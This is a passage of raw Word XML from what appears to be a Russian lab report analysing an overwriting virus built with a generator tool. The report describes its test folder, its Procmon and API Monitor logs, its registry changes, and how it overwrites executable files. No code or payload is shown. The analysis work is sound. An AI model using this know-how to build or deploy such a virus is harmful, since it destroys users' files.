      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:num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смена обоев на рабочем столе;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A6C1F1" w14:textId="15FFE379" w:rsidR="00B57749" w:rsidRDefault="00B57749" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:num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скрытие часов на панели задач.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B8DE0D" w14:textId="77777777" w:rsidR="006C5B47" w:rsidRDefault="006C5B47" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251665408" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5D580230" wp14:editId="374F5C8B">
            <wp:simplePos x="2068286" y="3233057"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3607200" cy="3139200"/>
            <wp:effectExtent l="0" t="0" r="0" b="444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00" cy="31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64338" w14:textId="38B1B968" w:rsidR="00B57749" w:rsidRPr="00B57749" w:rsidRDefault="006C5B47" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="ad"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Ref102651497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9</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Интерфейс генератора</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710FF34F" w14:textId="704B5553" w:rsidR="006C5B47" w:rsidRDefault="006C5B47" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="565"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia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8A4A833" wp14:editId="1DEB25CD">
            <wp:simplePos x="2024380" y="718185"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3658323" cy="31896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323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DF06DF" w14:textId="582098E9" w:rsidR="006C5B47" w:rsidRDefault="006C5B47" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Ref102651509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10</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Интерфейс генератора</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272CB0D0" w14:textId="77777777" w:rsidR="00F8765E" w:rsidRDefault="00F8765E" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34D805CC" w14:textId="48CE3F8C" w:rsidR="006C5B47" w:rsidRPr="002170F2" w:rsidRDefault="002170F2" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="36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В</w:t>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> каталог </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F237AE" w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>virus</w:t>
      </w:r>
      <w:r w:rsidR="00036C68">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidR="00F237AE" w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>disk_test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F237AE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были скопированы </w:t>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">два </w:t>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exe</w:t>
      </w:r>
      <w:r w:rsidR="00F237AE" w:rsidRPr="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>файла.</w:t>
      </w:r>
      <w:r w:rsidR="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102651730 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00F237AE">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> отображает исходные свойства этих файлов.</w:t>
      </w:r>
      <w:r w:rsidR="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> Также в каталоге был сохранен </w:t>
      </w:r>
      <w:r w:rsidR="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exe</w:t>
      </w:r>
      <w:r w:rsidR="00F8765E" w:rsidRPr="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>файл вируса.</w:t>
      </w:r>
      <w:r w:rsidRPr="002170F2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fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>REF</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> _</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>Ref</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText>102651953 \</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>h</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457" w:rsidRPr="004E5FC2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>MERGEFORMAT</w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457" w:rsidRPr="004E5FC2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00F8765E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F8765E">
        <w:t>отображает</w:t>
      </w:r>
      <w:r w:rsidRPr="00F8765E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>исходное состояние рабочего стола</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F8765E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75228184" w14:textId="77777777" w:rsidR="002170F2" w:rsidRDefault="002170F2" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/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5D8CF61" wp14:editId="7BD9BC05">
            <wp:simplePos x="1262743" y="718457"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4834800" cy="2710800"/>
            <wp:effectExtent l="0" t="0" r="444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0" cy="27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21C0F" w14:textId="13CDC9D7" w:rsidR="002170F2" w:rsidRDefault="002170F2" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273" w:firstLine="143"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:bookmarkStart w:id="11" w:name="_Ref102651945"/>
      <w:bookmarkStart w:id="12" w:name="_Ref102651953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11</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
      <w:r w:rsidRPr="002170F2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="002170F2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Исходное состояние рабочего стола</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="3EE94EE2" w14:textId="77777777" w:rsidR="00F8765E" w:rsidRPr="002170F2" w:rsidRDefault="00F8765E" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1273" w:firstLine="143"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7ECCA50B" w14:textId="226C4849" w:rsidR="001E64C6" w:rsidRDefault="00F8765E" w:rsidP="004E5FC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Далее была запущена программа </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Procmon</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>, запущен вирус и зафиксирован протокол его работы</w:t>
      </w:r>
      <w:r w:rsidR="00EE7C04">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102662168 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r w:rsidR="00A32FCB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00EE7C04">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B25D52" w14:textId="77777777" w:rsidR="00EE7C04" w:rsidRDefault="00EE7C04" w:rsidP="004E5FC2">
      <w:pPr>
        <w:keepNext/>
        <w:suppressAutoHyphens/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46488069" wp14:editId="20FF13AA">
            <wp:simplePos x="1262743" y="5344886"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4755600" cy="3254400"/>
            <wp:effectExtent l="0" t="0" r="6985" b="317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2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17DA4" w14:textId="69632117" w:rsidR="00EE7C04" w:rsidRPr="00F8765E" w:rsidRDefault="00EE7C04" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981" w:firstLine="143"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:bookmarkStart w:id="13" w:name="_Ref102662168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12</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Протокол работы вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00375148" w14:textId="06EC89CB" w:rsidR="00F8765E" w:rsidRDefault="00F8765E" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B6EEC77" w14:textId="78D0CEF9" w:rsidR="00EE7C04" w:rsidRDefault="00EE7C04" w:rsidP="004E5FC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Как видно из рисунка, вредоносная программа изменяет значения р</w:t>
      </w:r>
      <w:r w:rsidR="00036251">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">еестра </w:t>
      </w:r>
      <w:r w:rsidR="00036251">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r w:rsidR="00036251" w:rsidRPr="00036251">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102663156 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> отражает изменение исходных файлов: размер файлов стал равен размеру файла вируса. Это говорит о том, что вирус пере</w:t>
      </w:r>
      <w:r w:rsidR="00543630">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>за</w:t>
      </w:r>
      <w:r w:rsidR="00A969A7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">писал исходный код программ. Значит, лечению такие файлы не подлежат. Также </w:t>
      </w:r>
      <w:r w:rsidR="00543630">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>невозможно функционирование данных программ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27361707" w14:textId="06299956" w:rsidR="00A969A7" w:rsidRDefault="00A969A7" w:rsidP="004E5FC2">
      <w:pPr>
        <w:keepNext/>
        <w:suppressAutoHyphens/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia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519A53F4" wp14:editId="50D7D594">
            <wp:simplePos x="1567180" y="2557780"/>
            <wp:positionH relativeFrom="page">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4474800" cy="576000"/>
            <wp:effectExtent l="0" t="0" r="254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C233D" w14:textId="22B1BE7B" w:rsidR="00A969A7" w:rsidRDefault="00A969A7" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Ref102663156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13</w:t>
      </w:r>
      <w:r w:rsidR="00395299">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF3DB4">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Результат работы вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343C0FDE" w14:textId="77777777" w:rsidR="00A43AF9" w:rsidRPr="00036251" w:rsidRDefault="00A43AF9" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="afffa"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1981"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="242C529A" w14:textId="2794B2E7" w:rsidR="00EE7C04" w:rsidRPr="00036C68" w:rsidRDefault="00036C68" w:rsidP="004E5FC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С помощью утилиты </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r w:rsidRPr="00036C68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Monitor</w:t>
      </w:r>
      <w:r w:rsidRPr="00036C68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был зафиксирован протокол работы вируса. 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_Ref102663728 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457"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r>
        <w:t xml:space="preserve">На рисунке </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>14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 можно увидеть процесс копирования файла вируса в файлы, хранящиеся в каталоге </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001E64C6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>virus_disk_test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00A43AF9">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00865F07">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r w:rsidR="00865F07" w:rsidRPr="00036C68">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00865F07">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Monitor</w:t>
      </w:r>
      <w:r w:rsidR="00865F07">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> позволяет увидеть последовательность действий вируса: сначала вирус получает доступ к реестру, затем осуществляет деструктивные функции, ищет файлы, которые он еще может заразить, перезаписывает их.</w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> На </w:t>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00DB63E5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref102677119 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EB2457">
        <w:rPr>
